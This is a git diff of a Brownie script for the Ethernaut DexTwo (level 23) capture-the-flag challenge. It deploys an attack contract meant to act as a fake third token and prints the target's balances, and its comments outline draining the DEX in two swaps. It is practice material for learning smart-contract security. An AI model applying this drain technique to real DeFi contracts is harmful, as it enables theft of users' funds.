@@ -1,5 +1,5 @@
 from scripts.helpful_scripts import get_account
-from brownie import web3, interface, convert, DexTwo
+from brownie import web3, interface, convert, DexTwo, Attack23
 from eth_utils import keccak
 
 
@@ -14,6 +14,15 @@ GAS_LIMIT = 12000000
 def main():
     player = get_account()
     target = interface.IDexTwo(ETHERNAUT_INSTANCE)
+    attack = Attack23.deploy(ETHERNAUT_INSTANCE, 0, 200, {"from": player})
+    print_balances(target)
+
+
+def print_balances(_target):
+    token1_balance = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
+    token2_balance = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
+    print(f"\nBalance of token1 = {token1_balance}")
+    print(f"Balance of token2 = {token2_balance}\n")
 
 
 """ 
@@ -34,11 +43,10 @@ def main():
     
         Attack philosophy:
 
-    1. we are not restricted to swapping JUST between token1 and token2
+    1. deploy an attack contract to act as a 3rd token pool ??
 
-    2. maybe we can deploy an attack contract to act as a 3rd token pool ??
-
-    3. swap calculation in level-23 spreadsheet
+    2. swap calculation in level-23 spreadsheet
     
+    3. can do this in 2 swaps, starting with 200 of token3_player
 
 """
